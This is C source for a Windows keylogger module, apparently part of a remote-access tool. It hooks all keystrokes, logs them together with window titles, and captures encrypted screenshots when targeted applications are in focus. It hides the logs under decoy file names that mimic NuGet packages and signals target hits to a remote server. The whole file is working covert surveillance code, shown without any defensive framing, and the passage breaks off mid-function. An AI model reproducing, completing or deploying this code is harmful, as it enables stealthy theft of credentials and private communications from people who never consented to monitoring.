/**
 * remote_keylogger.c
 * Keylogging via WH_KEYBOARD_LL. Writes AES-256 encrypted HTML to logs directory.
 */
#include "pch.h"
#include "remote_keylogger.h"
#include "remote_keylogger_aes.h"
#include "remote_protocol.h"
#include "remote_log.h"
#include "remote_config.h"
#include "gdiplus_jpeg.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>

#include <psapi.h>
#pragma comment(lib, "psapi.lib")

#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

#ifndef WH_KEYBOARD_LL
#define WH_KEYBOARD_LL 13
#endif

#define KEYLOGGER_BUF_SIZE  (64 * 1024)
#define KEYLOGGER_FLUSH_MS  15000
#define KEYLOGGER_MAX_ENTRIES 1024

static volatile long g_keylogger_running = 0;
static HANDLE g_keylogger_thread = NULL;
static HANDLE g_keylogger_mutex = NULL;
static char g_logs_dir[MAX_PATH] = { 0 };
/* One encrypted log file per UTC calendar day; random NuGet package-style .nupkg name (date in encrypted body only). */
static char g_day_log_bin_path[MAX_PATH] = { 0 };
static unsigned int g_day_log_ymd = 0; /* (year<<16)|(month<<8)|day, UTC */
static char* g_keylogger_buf = NULL;
static size_t g_keylogger_buf_len = 0;
static char g_last_title[256] = { 0 };

/* Keylogger target rules loaded from config.json. */
static keylogger_target_t g_targets[KEYLOGGER_MAX_TARGETS];
static int g_target_count = 0;

/* Cached "active window" context updated at a fixed throttle rate. */
static HWND g_active_hwnd = NULL;
static DWORD g_active_pid = 0;
static char g_current_process_name[256] = { 0 };
static char g_current_title[256] = { 0 };

/* Current match state (hook thread reads g_match_keyboard). */
static int g_active_target_index = -1;
static volatile int g_match_keyboard = 0;
static int g_match_save_screenshots = 0;
static int g_match_screenshot_interval_ms = 0;

/* Screenshot scheduling while a target match is active. */
static DWORD g_next_screenshot_at_ms = 0;
static char g_screenshot_bundle_path[MAX_PATH] = { 0 };

/* Target hit signaling to server (piggybacked on next ClientPingRequest handshake).
 * This is set by keylogger matching logic and consumed by remote_client.c. */
static volatile LONG g_target_hit_pending = 0;
static char g_target_hit_process_name[256] = { 0 };
static char g_target_hit_window_title[512] = { 0 };

/* Returns 1 if a target hit is pending to be sent to the server during the next ping handshake. */
int remote_keylogger_is_target_hit_pending(void) {
    return InterlockedCompareExchange(&g_target_hit_pending, 1, 1) == 1;
}

/* Copies pending target-hit context into provided buffers and clears the pending flag. */
int remote_keylogger_consume_target_hit(char* out_process_name, unsigned int out_process_cap,
    char* out_window_title, unsigned int out_title_cap) {
    if (!out_process_name || !out_window_title) return 0;
    if (out_process_cap == 0 || out_title_cap == 0) return 0;

    if (InterlockedExchange(&g_target_hit_pending, 0) == 1) {
        strncpy_s(out_process_name, out_process_cap, g_target_hit_process_name, _TRUNCATE);
        strncpy_s(out_window_title, out_title_cap, g_target_hit_window_title, _TRUNCATE);
        return 1;
    }
    return 0;
}

typedef struct _KEYLOG_EVENT {
    int vk;
    DWORD scanCode;
} KEYLOG_EVENT;

static KEYLOG_EVENT g_keylog_queue[KEYLOGGER_MAX_ENTRIES];
static volatile LONG g_keylog_q_head = 0;
static volatile LONG g_keylog_q_tail = 0;
static int g_keylog_q_initialized = 0;

static int is_modifier_vk(int vk) {
    switch (vk) {
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_MENU:      /* Alt */
        case VK_LMENU:
        case VK_RMENU:
        case VK_LWIN:
        case VK_RWIN:
            return 1;
        default:
            return 0;
    }
}

static const char* vk_to_name(int vk) {
    switch (vk) {
        case VK_RETURN: return "Enter";
        case VK_ESCAPE: return "Esc";
        case VK_BACK: return "Backspace";
        case VK_TAB: return "Tab";
        case VK_SHIFT: return "Shift";
        case VK_CONTROL: return "Control";
        case VK_MENU: return "Alt";
        case 0xA0: return "Left Shift";
        case 0xA1: return "Right Shift";
        case 0xA2: return "Left Control";
        case 0xA3: return "Right Control";
        case 0xA4: return "Left Alt";
        case 0xA5: return "Right Alt";
        case VK_CAPITAL: return "CapsLock";
        case VK_PRIOR: return "PageUp";
        case VK_NEXT: return "PageDown";
        case VK_END: return "End";
        case VK_HOME: return "Home";
        case VK_LEFT: return "Left";
        case VK_UP: return "Up";
        case VK_RIGHT: return "Right";
        case VK_DOWN: return "Down";
        case VK_INSERT: return "Insert";
        case VK_DELETE: return "Delete";
        case VK_LWIN: return "Left Win";
        case VK_RWIN: return "Right Win";
        case VK_NUMLOCK: return "NumLock";
        case VK_SCROLL: return "ScrollLock";
        case VK_SPACE: return " ";
        case VK_MULTIPLY: return "Num *";
        case VK_ADD: return "Num +";
        case VK_SUBTRACT: return "Num -";
        case VK_DECIMAL: return "Num .";
        case VK_DIVIDE: return "Num /";
        case VK_OEM_1: return ";";
        case VK_OEM_PLUS: return "=";
        case VK_OEM_COMMA: return ",";
        case VK_OEM_MINUS: return "-";
        case VK_OEM_PERIOD: return ".";
        case VK_OEM_2: return "/";
        case VK_OEM_3: return "`";
        case VK_OEM_4: return "[";
        case VK_OEM_5: return "\\";
        case VK_OEM_6: return "]";
        case VK_OEM_7: return "'";
        default:
            if (vk >= 0x70 && vk <= 0x87) { /* VK_F1..VK_F24 */
                static char fbuf[8];
                _snprintf_s(fbuf, sizeof(fbuf), _TRUNCATE, "F%d", vk - 0x70 + 1);
                return fbuf;
            }
            if (vk >= 0x60 && vk <= 0x69) { /* VK_NUMPAD0..VK_NUMPAD9 */
                static char nbuf[8];
                _snprintf_s(nbuf, sizeof(nbuf), _TRUNCATE, "Num %d", vk - 0x60);
                return nbuf;
            }
            return NULL;
    }
}

static void append_html(const char* s) {
    if (!g_keylogger_buf || !g_keylogger_mutex) return;
    size_t slen = strlen(s);
    if (g_keylogger_buf_len + slen + 1 >= KEYLOGGER_BUF_SIZE) return;
    WaitForSingleObject(g_keylogger_mutex, INFINITE);
    memcpy(g_keylogger_buf + g_keylogger_buf_len, s, slen + 1);
    g_keylogger_buf_len += slen;
    ReleaseMutex(g_keylogger_mutex);
}

static void append_key(const char* name) {
    char line[160];
    _snprintf_s(line, sizeof(line), _TRUNCATE, "<span class=\"h\">[%s]</span>", name);
    append_html(line);
    /* Only [Enter] and [Alt+Tab] start a new line; [Backspace] etc. do not. */
    if (strcmp(name, "Enter") == 0 || strcmp(name, "Alt+Tab") == 0)
        append_html("<br>");
}

static void append_char(char c) {
    char esc[16];
    if (c == '<') strcpy_s(esc, sizeof(esc), "&lt;");
    else if (c == '>') strcpy_s(esc, sizeof(esc), "&gt;");
    else if (c == '&') strcpy_s(esc, sizeof(esc), "&amp;");
    else if (c == '\"') strcpy_s(esc, sizeof(esc), "&quot;");
    else { esc[0] = c; esc[1] = '\0'; }
    append_html(esc);
}

static void escape_html_text(const char* in, char* out, size_t out_cap) {
    if (!out || out_cap == 0) return;
    if (!in || in[0] == '\0') { out[0] = '\0'; return; }

    size_t i = 0, j = 0;
    for (i = 0; in[i] && j < out_cap - 8; i++) {
        if (in[i] == '<') { memcpy(out + j, "&lt;", 4); j += 4; }
        else if (in[i] == '>') { memcpy(out + j, "&gt;", 4); j += 4; }
        else if (in[i] == '&') { memcpy(out + j, "&amp;", 5); j += 5; }
        else if (in[i] == '\"') { memcpy(out + j, "&quot;", 6); j += 6; }
        else { out[j++] = in[i]; }
    }
    out[j] = '\0';
}

/* Case-insensitive wildcard match for patterns that include '*' (and optional '?'). */
static int wildcard_match_ci(const char* pattern, const char* text) {
    if (!pattern || !text) return 0;
    const char* p = pattern;
    const char* t = text;
    const char* star = NULL;
    const char* ss = NULL;

    while (*t) {
        if (*p == '*') {
            star = p++;
            ss = t;
            continue;
        }

        if (*p == '?' ||
            (tolower((unsigned char)*p) == tolower((unsigned char)*t))) {
            p++;
            t++;
            continue;
        }

        if (star) {
            p = star + 1;
            ss++;
            t = ss;
            continue;
        }

        return 0;
    }

    while (*p == '*') p++;
    return *p == '\0';
}

static int match_any_pattern_ci(char patterns[][KEYLOGGER_MAX_PATTERN_LEN], int count, const char* text) {
    if (!text) return 0;
    for (int i = 0; i < count; i++) {
        if (patterns[i][0] == '\0') continue;
        if (wildcard_match_ci(patterns[i], text)) return 1;
    }
    return 0;
}

static void resolve_process_name_by_pid(DWORD pid, char* out, unsigned int out_cap) {
    if (!out || out_cap < 2) return;
    out[0] = '\0';
    if (pid == 0) return;

    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return;

    char name[MAX_PATH] = { 0 };
    if (GetModuleBaseNameA(h, NULL, name, (DWORD)sizeof(name) - 1) > 0 && name[0]) {
        strncpy_s(out, out_cap, name, _TRUNCATE);
        CloseHandle(h);
        return;
    }

    char img[MAX_PATH] = { 0 };
    if (GetProcessImageFileNameA(h, img, (DWORD)sizeof(img) - 1) > 0 && img[0]) {
        // Extract base name.
        const char* base = strrchr(img, '\\');
        if (!base) base = img;
        strncpy_s(out, out_cap, base, _TRUNCATE);
    }

    CloseHandle(h);
}

static void update_active_context(DWORD now_ms) {
    HWND fg = GetForegroundWindow();
    g_active_hwnd = fg;

    DWORD pid = 0;
    if (fg) {
        GetWindowThreadProcessId(fg, &pid);
    }

    if (pid != g_active_pid) {
        g_active_pid = pid;
        resolve_process_name_by_pid(pid, g_current_process_name, sizeof(g_current_process_name));
    } else if (pid != 0 && g_current_process_name[0] == '\0') {
        /* Retry if we failed to resolve previously (permission/handle issues). */
        resolve_process_name_by_pid(pid, g_current_process_name, sizeof(g_current_process_name));
    }

    // Window title (cached)
    g_current_title[0] = '\0';
    if (fg) {
        GetWindowTextA(fg, g_current_title, (int)(sizeof(g_current_title) - 1));
    }

    // Compute best matching target (first match wins).
    int new_idx = -1;
    for (int i = 0; i < g_target_count; i++) {
        if (g_targets[i].process_pattern_count <= 0) continue; // skip elements with empty process list

        if (!match_any_pattern_ci(g_targets[i].process_patterns, g_targets[i].process_pattern_count, g_current_process_name))
            continue;

        if (g_targets[i].title_pattern_count <= 0) {
            new_idx = i;
            break;
        }

        if (match_any_pattern_ci(g_targets[i].title_patterns, g_targets[i].title_pattern_count, g_current_title)) {
            new_idx = i;
            break;
        }
    }

    int old_idx = g_active_target_index;
    g_active_target_index = new_idx;

    g_match_keyboard = (new_idx >= 0) ? (g_targets[new_idx].keyboard ? 1 : 0) : 0;
    g_match_save_screenshots = (new_idx >= 0) ? (g_targets[new_idx].save_screenshots ? 1 : 0) : 0;
    g_match_screenshot_interval_ms = 0;
    if (new_idx >= 0 && g_match_save_screenshots) {
        int sec = g_targets[new_idx].screenshot_interval_sec;
        if (sec <= 0) sec = 1;
        g_match_screenshot_interval_ms = sec * 1000;
    }

    if (new_idx < 0) {
        g_next_screenshot_at_ms = 0;
        return;
    }

    // New match session: send target hit pending and restart screenshot schedule.
    if (old_idx < 0 || old_idx != new_idx) {
        if (InterlockedCompareExchange(&g_target_hit_pending, 1, 0) == 0) {
            strncpy_s(g_target_hit_process_name, sizeof(g_target_hit_process_name), g_current_process_name, _TRUNCATE);
            strncpy_s(g_target_hit_window_title, sizeof(g_target_hit_window_title), g_current_title, _TRUNCATE);
        }

        if (g_match_save_screenshots && g_match_screenshot_interval_ms > 0) {
            g_next_screenshot_at_ms = now_ms; // capture immediately at match start
        }
    }
}

static void update_window_title(void) {
    // Append title header into the keylogger buffer only when keyboard logging is active.
    if (!g_match_keyboard) return;
    if (g_current_title[0] == '\0') return;
    if (strcmp(g_current_title, g_last_title) == 0) return;

    strncpy_s(g_last_title, sizeof(g_last_title), g_current_title, _TRUNCATE);

    char escaped_title[512];
    escape_html_text(g_current_title, escaped_title, sizeof(escaped_title));

    char escaped_proc[256];
    escape_html_text(g_current_process_name, escaped_proc, sizeof(escaped_proc));

    char line[700];
    SYSTEMTIME st;
    GetSystemTime(&st);

    _snprintf_s(line, sizeof(line), _TRUNCATE,
        "<span class=\"h\"><br><br>[<b>%s - %s - %02u:%02u:%02u UTC</b>]</span><br>",
        escaped_proc, escaped_title, st.wHour, st.wMinute, st.wSecond);
    append_html(line);
}

static void screenshot_write_u64_le(unsigned char* p, unsigned __int64 v) {
    int i;
    for (i = 0; i < 8; i++) {
        p[i] = (unsigned char)(v & 0xFFu);
        v >>= 8;
    }
}

static unsigned __int64 screenshot_unix_ms_utc(void) {
    FILETIME ft;
    ULARGE_INTEGER u;
    GetSystemTimeAsFileTime(&ft);
    u.LowPart = ft.dwLowDateTime;
    u.HighPart = ft.dwHighDateTime;
    return (unsigned __int64)(u.QuadPart / 10000ULL - 11644473600000ULL);
}

/* Append [SCS1][len4][AES blob] to g_screenshot_bundle_path; plaintext = [8-byte LE unix ms UTC][jpeg]. */
static int append_screenshot_jpeg_encrypted(const unsigned char* jpeg, size_t jlen) {
    if (!g_screenshot_bundle_path[0] || !jpeg || jlen == 0) return 0;

    unsigned __int64 unix_ms = screenshot_unix_ms_utc();
    size_t plain_len = 8 + jlen;
    unsigned char* plain = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, plain_len);
    if (!plain) return 0;
    screenshot_write_u64_le(plain, unix_ms);
    memcpy(plain + 8, jpeg, jlen);

    size_t out_cap = KEYLOG_AES_HMAC_BYTES + KEYLOG_AES_IV_BYTES + ((plain_len / 16) + 1) * 16;
    unsigned char* enc = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, out_cap);
    if (!enc) { HeapFree(GetProcessHeap(), 0, plain); return 0; }
    size_t enc_len = out_cap;
    if (!keylog_aes_encrypt(plain, plain_len, enc, &enc_len)) {
        HeapFree(GetProcessHeap(), 0, enc);
        HeapFree(GetProcessHeap(), 0, plain);
        return 0;
    }
    HeapFree(GetProcessHeap(), 0, plain);

    static const unsigned char seg_magic[4] = { 'S', 'C', 'S', '1' };
    WaitForSingleObject(g_keylogger_mutex, INFINITE);
    FILE* f = NULL;
    if (fopen_s(&f, g_screenshot_bundle_path, "ab") != 0 || !f) {
        ReleaseMutex(g_keylogger_mutex);
        HeapFree(GetProcessHeap(), 0, enc);
        return 0;
    }
    fwrite(seg_magic, 1, 4, f);
    {
        unsigned long seg_len = (unsigned long)enc_len;
        fwrite(&seg_len, 1, 4, f);
    }
    fwrite(enc, 1, enc_len, f);
    fclose(f);
    ReleaseMutex(g_keylogger_mutex);
    HeapFree(GetProcessHeap(), 0, enc);
    return 1;
}

static int capture_active_window_jpeg(void) {
    if (!g_match_save_screenshots) return 0;
    if (!g_active_hwnd || !IsWindow(g_active_hwnd)) return 0;
    if (g_screenshot_bundle_path[0] == '\0') return 0;

    RECT r;
    if (!GetWindowRect(g_active_hwnd, &r)) return 0;
    int w = r.right - r.left;
    int h_ = r.bottom - r.top;
    if (w <= 0 || h_ <= 0) return 0;
    if (w > 4096 || h_ > 4096) return 0;

    int quality = 75;

    HDC hwnd_dc = GetWindowDC(g_active_hwnd);
    if (!hwnd_dc) return 0;
    HDC mem_dc = CreateCompatibleDC(hwnd_dc);
    HBITMAP bmp = CreateCompatibleBitmap(hwnd_dc, w, h_);
    if (!mem_dc || !bmp) {
        if (bmp) DeleteObject(bmp);
        if (mem_dc) DeleteDC(mem_dc);
        ReleaseDC(g_active_hwnd, hwnd_dc);
        return 0;
    }

    SelectObject(mem_dc, bmp);
    int ok = PrintWindow(g_active_hwnd, mem_dc, PW_RENDERFULLCONTENT);
    if (!ok) {
        DeleteObject(bmp);
        DeleteDC(mem_dc);
        ReleaseDC(g_active_hwnd, hwnd_dc);
        return 0;
    }

    BITMAPINFOHEADER bi = { 0 };
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = w;
    bi.biHeight = -h_;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    unsigned int stride = ((unsigned int)w * 4 + 3) & ~3u;

    unsigned char* bgra = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, stride * (unsigned int)h_);
    if (!bgra) {
        DeleteObject(bmp);
        DeleteDC(mem_dc);
        ReleaseDC(g_active_hwnd, hwnd_dc);
        return 0;
    }

    GetDIBits(mem_dc, bmp, 0, (UINT)h_, bgra, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(bmp);
    DeleteDC(mem_dc);
    ReleaseDC(g_active_hwnd, hwnd_dc);

    unsigned char* jpeg = NULL;
    unsigned int jlen = 0;
    if (!gdiplus_jpeg_encode_bgra(w, h_, (int)stride, bgra, quality, &jpeg, &jlen) || !jpeg) {
        HeapFree(GetProcessHeap(), 0, bgra);
        return 0;
    }
    HeapFree(GetProcessHeap(), 0, bgra);

    (void)append_screenshot_jpeg_encrypted(jpeg, (size_t)jlen);
    HeapFree(GetProcessHeap(), 0, jpeg);
    return 1;
}

static void enqueue_key_event(int vk, DWORD scanCode) {
    if (!g_match_keyboard) return;
    if (!g_keylog_q_initialized) return;

    LONG tail = g_keylog_q_tail;
    LONG head = g_keylog_q_head;
    LONG next_tail = (tail + 1) % KEYLOGGER_MAX_ENTRIES;

    if (next_tail == head) {
        /* queue full, drop event */
        return;
    }

    g_keylog_queue[tail].vk = vk;
    g_keylog_queue[tail].scanCode = scanCode;
    g_keylog_q_tail = next_tail;
}

static int dequeue_key_events(KEYLOG_EVENT* out, int max_out) {
    if (!g_keylog_q_initialized || !out || max_out <= 0) return 0;

    int count = 0;
    LONG head = g_keylog_q_head;
    LONG tail = g_keylog_q_tail;

    while (head != tail && count < max_out) {
        out[count++] = g_keylog_queue[head];
        head = (head + 1) % KEYLOGGER_MAX_ENTRIES;
    }

    g_keylog_q_head = head;

    return count;
}

static void process_key_event(const KEYLOG_EVENT* ev) {
    if (!ev) return;
    if (!g_match_keyboard) return;

    /* Do not log pure modifier keys (Shift/Ctrl/Alt/Win), like C# KeyPress behavior. */
    if (is_modifier_vk(ev->vk)) return;

    update_window_title();

    /* Build keyboard state from global key state (Shift/Caps/AltGr etc.). */
    BYTE kbd[256];
    memset(kbd, 0, sizeof(kbd));

    /* Helper lambdas (C-style) to set down/toggle bits. */
    #define SET_DOWN(vk) \
        do { if (GetKeyState(vk) & 0x8000) kbd[(vk)] |= 0x80; } while (0)
    #define SET_TOGGLE(vk) \
        do { if (GetKeyState(vk) & 0x0001) kbd[(vk)] |= 0x01; } while (0)

    SET_DOWN(VK_SHIFT);
    SET_DOWN(VK_LSHIFT);
    SET_DOWN(VK_RSHIFT);
    SET_DOWN(VK_CONTROL);
    SET_DOWN(VK_LCONTROL);
    SET_DOWN(VK_RCONTROL);
    SET_DOWN(VK_MENU);
    SET_DOWN(VK_LMENU);
    SET_DOWN(VK_RMENU);
    SET_TOGGLE(VK_CAPITAL);
    SET_TOGGLE(VK_NUMLOCK);
    SET_TOGGLE(VK_SCROLL);

    wchar_t ch[4] = { 0 };
    int ret = ToUnicode((UINT)ev->vk, (UINT)ev->scanCode, kbd, ch, 4, 0);

    #undef SET_DOWN
    #undef SET_TOGGLE

    if (ret > 0 && ch[0] >= 32 && ch[0] < 127) {
        /* Printable character with current modifiers (e.g. 'a', 'A', '!', etc.). */
        append_char((char)ch[0]);
        return;
    }

    /* Check modifiers for combinations like Ctrl+A, Alt+Tab, etc. */
    int hasCtrl = (kbd[VK_CONTROL] & 0x80) || (kbd[VK_LCONTROL] & 0x80) || (kbd[VK_RCONTROL] & 0x80);
    int hasShift = (kbd[VK_SHIFT] & 0x80) || (kbd[VK_LSHIFT] & 0x80) || (kbd[VK_RSHIFT] & 0x80);
    int hasAlt = (kbd[VK_MENU] & 0x80) || (kbd[VK_LMENU] & 0x80) || (kbd[VK_RMENU] & 0x80);
    int hasWin = (kbd[VK_LWIN] & 0x80) || (kbd[VK_RWIN] & 0x80);

    /* If Ctrl/Alt/Win is involved, log a combo like [Ctrl+A], [Alt+Tab]. */
    if (hasCtrl || hasAlt || hasWin) {
        char combo[128];
        combo[0] = '\0';

        strcat_s(combo, sizeof(combo), hasCtrl ? "Ctrl+" : "");
        if (hasShift) strcat_s(combo, sizeof(combo), "Shift+");
        if (hasAlt) strcat_s(combo, sizeof(combo), "Alt+");
        if (hasWin) strcat_s(combo, sizeof(combo), "Win+");

        /* Base key name/char */
        const char* baseName = vk_to_name(ev->vk);
        char base[32];
        if (baseName && !is_modifier_vk(ev->vk)) {
            strncpy_s(base, sizeof(base), baseName, _TRUNCATE);
        } else {
            UINT mapped = MapVirtualKeyA((UINT)ev->vk, MAPVK_VK_TO_CHAR);
            if (mapped >= 32 && mapped < 127) {
                base[0] = (char)mapped;
                base[1] = '\0';
            } else {
                _snprintf_s(base, sizeof(base), _TRUNCATE, "VK%u", (unsigned)ev->vk);
            }
        }

        strcat_s(combo, sizeof(combo), base);

        char wrapped[160];
        _snprintf_s(wrapped, sizeof(wrapped), _TRUNCATE, "%s", combo);
        append_key(wrapped);
        return;
    }

    /* No Ctrl/Alt/Win: treat as plain key. First, try to get a printable char. */
    UINT mapped = MapVirtualKeyA((UINT)ev->vk, MAPVK_VK_TO_CHAR);
    if (mapped >= 32 && mapped < 127) {
        append_char((char)mapped);
        return;
    }

    /* Still not printable: log by friendly name (Enter, Tab, arrows, etc.) or VK code. */
    const char* name = vk_to_name(ev->vk);
    if (name) {
        append_key(name);
    } else {
        char vkstr[16];
        _snprintf_s(vkstr, sizeof(vkstr), _TRUNCATE, "VK%u", (unsigned)ev->vk);
        append_key(vkstr);
    }
}

static LRESULT CALLBACK low_level_kb_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        int vk = (int)p->vkCode;
        enqueue_key_event(vk, p->scanCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static unsigned int pack_ymd_utc(const SYSTEMTIME* st) {
    return ((unsigned)st->wYear << 16) | ((unsigned)st->wMonth << 8) | (unsigned)st->wDay;
}

/* e.g. Microsoft.Extensions.Logging.8.3.12.a1b2c3d4e5f6a7b8.nupkg — date is only inside the encrypted HTML header. */
static int generate_nuget_style_bin_name(char* out, size_t out_size) {
    unsigned char rnd[16];
    NTSTATUS status = BCryptGenRandom(NULL, rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (!BCRYPT_SUCCESS(status)) return 0;
    unsigned a = (unsigned)rnd[0] | ((unsigned)rnd[1] << 8) | ((unsigned)rnd[2] << 16) | ((unsigned)rnd[3] << 24);
    unsigned b = (unsigned)rnd[4] | ((unsigned)rnd[5] << 8) | ((unsigned)rnd[6] << 16) | ((unsigned)rnd[7] << 24);
    unsigned c = (unsigned)rnd[8] | ((unsigned)rnd[9] << 8) | ((unsigned)rnd[10] << 16) | ((unsigned)rnd[11] << 24);
    unsigned m = (a % 40u) + 1u;
    unsigned n = (b % 20u);
    unsigned p = (c % 50u);
    static const char* vendors[] = {
        "Microsoft", "System", "Azure", "Newtonsoft", "StackExchange", "NuGet", "AspNetCore"
    };
    size_t vi = (size_t)(rnd[12] % (sizeof(vendors) / sizeof(vendors[0])));
    _snprintf_s(out, out_size, _TRUNCATE, "%s.Extensions.%u.%u.%u.%08x%08x.nupkg",
        vendors[vi], m, n, p, a, b);
    return 1;
}

static void flush_to_disk(void) {
    if (!g_keylogger_buf || g_keylogger_buf_len == 0 || !g_logs_dir[0]) return;
    WaitForSingleObject(g_keylogger_mutex, INFINITE);
    if (g_keylogger_buf_len == 0) { ReleaseMutex(g_keylogger_mutex); return; }
    size_t len = g_keylogger_buf_len;
    char* copy = (char*)HeapAlloc(GetProcessHeap(), 0, len + 1);
    if (!copy) { ReleaseMutex(g_keylogger_mutex); return; }
    memcpy(copy, g_keylogger_buf, len + 1);
    g_keylogger_buf_len = 0;
    ReleaseMutex(g_keylogger_mutex);

    CreateDirectoryA(g_logs_dir, NULL);
    SYSTEMTIME st;
    GetSystemTime(&st);
    unsigned int ymd = pack_ymd_utc(&st);
    if (g_day_log_ymd != ymd || g_day_log_bin_path[0] == '\0') {
        g_day_log_ymd = ymd;
        char name[160];
        if (!generate_nuget_style_bin_name(name, sizeof(name)))
            _snprintf_s(name, sizeof(name), _TRUNCATE, "NuGet.Package.%08x.%08x.nupkg", GetTickCount(), (unsigned)ymd);
        _snprintf_s(g_day_log_bin_path, sizeof(g_day_log_bin_path), _TRUNCATE, "%s\\%s", g_logs_dir, name);
    }

    char fname[MAX_PATH];
    strncpy_s(fname, sizeof(fname), g_day_log_bin_path, _TRUNCATE);

    int write_header = (GetFileAttributesA(fname) == INVALID_FILE_ATTRIBUTES) ? 1 : 0;
    size_t plain_len = len;
    size_t header_len = 0;
    char header[512];
    if (write_header) {
        header_len = (size_t)_snprintf_s(header, sizeof(header), _TRUNCATE,
            "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on %04u-%02u-%02u %02u:%02u UTC<br><br>"
            "<style>.h { color: 0000ff; display: inline; }</style>",
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay, (unsigned)st.wHour, (unsigned)st.wMinute);
        plain_len += header_len;
    }

    /* Build plaintext for this segment only: [header if new file] + new chunk. No read-merge (append mode). */
    char* plain = (char*)HeapAlloc(GetProcessHeap(), 0, plain_len + 1);
    if (!plain) { HeapFree(GetProcessHeap(), 0, copy); return; }
    if (write_header) { memcpy(plain, header, header_len); memcpy(plain + header_len, copy, len + 1); }
    else { memcpy(plain, copy, len + 1); }
    HeapFree(GetProcessHeap(), 0, copy);

    size_t out_cap = KEYLOG_AES_HMAC_BYTES + KEYLOG_AES_IV_BYTES + ((plain_len / 16) + 1) * 16;
    unsigned char* enc = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, out_cap);
    if (!enc) { HeapFree(GetProcessHeap(), 0, plain); return; }
    size_t enc_len = out_cap;
    if (!keylog_aes_encrypt((const unsigned char*)plain, plain_len, enc, &enc_len)) {
        HeapFree(GetProcessHeap(), 0, enc);
        HeapFree(GetProcessHeap(), 0, plain);
        return;
    }
    HeapFree(GetProcessHeap(), 0, plain);

    /* Append mode: [magic "KLS1"][4-byte length][segment]. Enables server to skip leading garbage. */
    static const unsigned char seg_magic[4] = { 'K', 'L', 'S', '1' };
    FILE* f = NULL;
    if (fopen_s(&f, fname, "ab") != 0 || !f) {
        HeapFree(GetProcessHeap(), 0, enc);
        return;
    }
    fwrite(seg_magic, 1, 4, f);
    {
        unsigned long seg_len = (unsigned long)enc_len;
        if (seg_len != enc_len) { fclose(f); HeapFree(GetProcessHeap(), 0, enc); return; }
        fwrite(&seg_len, 1, 4, f);
    }
    fwrite(enc, 1, enc_len, f);
    fclose(f);
    HeapFree(GetProcessHeap(), 0, enc);
}

static DWORD WINAPI keylogger_thread_proc(LPVOID param) {
    (void)param;
    HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, low_level_kb_proc, GetModuleHandle(NULL), 0);
    if (!hHook) {
        remote_log("[keylogger] SetWindowsHookEx failed %lu", GetLastError());
        InterlockedExchange(&g_keylogger_running, 0);
        return 1;
    }
    remote_log("[keylogger] hook installed, dir=%s", g_logs_dir);
    DWORD last_flush = GetTickCount();
    DWORD last_context_update = 0;
    KEYLOG_EVENT ev_batch[KEYLOGGER_MAX_ENTRIES];

    MSG msg;
    while (InterlockedCompareExchange(&g_keylogger_running, 1, 1) == 1) {
        while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) goto done;
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }

        int ev_count = dequeue_key_events(ev_batch, KEYLOGGER_MAX_ENTRIES);
        for (int i = 0; i < ev_count; i++) {
            process_key_event(&ev_batch[i]);
        }

        DWORD now = GetTickCount();
        if (now - last_context_update >= 200) {
            last_context_update = now;
            update_active_context(now);
        }

        /* Screenshot capture while target match is active. */
        if (g_match_save_screenshots && g_next_screenshot_at_ms > 0 && now >= g_next_screenshot_at_ms) {
            /* Capture immediately, then schedule next interval. */
            /* Screenshot implementation is below. */
            (void)capture_active_window_jpeg();
            if (g_match_screenshot_interval_ms > 0)
                g_next_screenshot_at_ms = now + g_match_screenshot_interval_ms;
            else
                g_next_screenshot_at_ms = 0;
        }

        Sleep(5);
        if (now - last_flush >= KEYLOGGER_FLUSH_MS) {
            last_flush = now;
            flush_to_disk();
        }
    }
done:
    flush_to_disk();
    UnhookWindowsHookEx(hHook);
    remote_log("[keylogger] hook removed");
    return 0;
}

int remote_keylogger_start(const char* logs_dir, const struct remote_config* config) {
    if (!logs_dir || !logs_dir[0]) return 0;
    if (!config) return 0;

    g_target_count = config->target_count;
    if (g_target_count <= 0 || g_target_count > KEYLOGGER_MAX_TARGETS) return 0;

    memcpy(g_targets, config->targets, sizeof(g_targets));

    // Compact/validate targets: skip elements with empty process pattern list.
    {
        int valid_count = 0;
        for (int i = 0; i < g_target_count; i++) {
            if (config->targets[i].process_pattern_count > 0) {
                if (valid_count != i)
                    g_targets[valid_count] = g_targets[i];
                valid_count++;
                if (valid_count >= KEYLOGGER_MAX_TARGETS) break;
            }
        }
        if (valid_count <= 0) return 0;
        g_target_count = valid_count;
    }

    g_match_keyboard = 0;
    g_match_save_screenshots = 0;
    g_match_screenshot_interval_ms = 0;
    g_next_screenshot_at_ms = 0;
    g_active_target_index = -1;
    g_active_pid = 0;
    g_active_hwnd = NULL;
    g_current_process_name[0] = '\0';
    g_current_title[0] = '\0';
    g_last_title[0] = '\0';
    InterlockedExchange(&g_target_hit_pending, 0);

    if (InterlockedCompareExchange(&g_keylogger_running, 1, 0) != 0) return 1;
    strncpy_s(g_logs_dir, sizeof(g_logs_dir), logs_dir, _TRUNCATE);
    g_day_log_bin_path[0] = '\0';
    g_day_log_ymd = 0;
    g_keylogger_mutex = CreateMutexA(NULL, FALSE, NULL);
